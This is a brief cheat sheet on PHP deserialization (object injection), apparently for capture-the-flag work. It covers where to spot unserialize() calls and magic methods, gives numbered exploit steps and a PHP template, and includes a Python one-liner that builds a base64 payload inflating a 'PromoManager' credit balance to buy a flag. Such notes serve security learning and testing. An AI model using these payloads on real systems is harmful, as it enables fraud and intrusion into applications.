# PHP Deserialization (Object Injection)

## Detection
- `unserialize()` on user input (cookies, POST, GET, base64-encoded)
- Classes with `__destruct()`, `__wakeup()`, `__toString()`, `__call()`

## Exploit Steps
1. Read source, find `unserialize()` call and input source
2. Find classes with magic methods that do dangerous operations
3. Craft serialized object with desired properties
4. Base64-encode if required by the application
5. Submit via the expected input channel

## Template
```php
<?php
class TargetClass {
    public $prop1 = "malicious_value";
    public $prop2 = 12345;
}
$obj = new TargetClass();
$serialized = serialize($obj);
echo base64_encode($serialized);
// Output: TzoxMjoiVGFyZ2V0Q2xhc3MiOjI6...
?>
```

## Remote one-liner (no PHP needed)
```bash
# Build serialized + base64 payload using python
python3 -c "
import base64
payload = 'O:12:\"PromoManager\":2:{s:12:\"promo_credit\";i:99999;s:10:\"promo_code\";s:4:\"test\";}'
print(base64.b64encode(payload.encode()).decode())
"
```

## Example: Coupon/Credit System
- Input: base64-encoded serialized PromoManager
- Destructor adds promo_credit to session balance
- Submit coupon → balance increases → buy flag
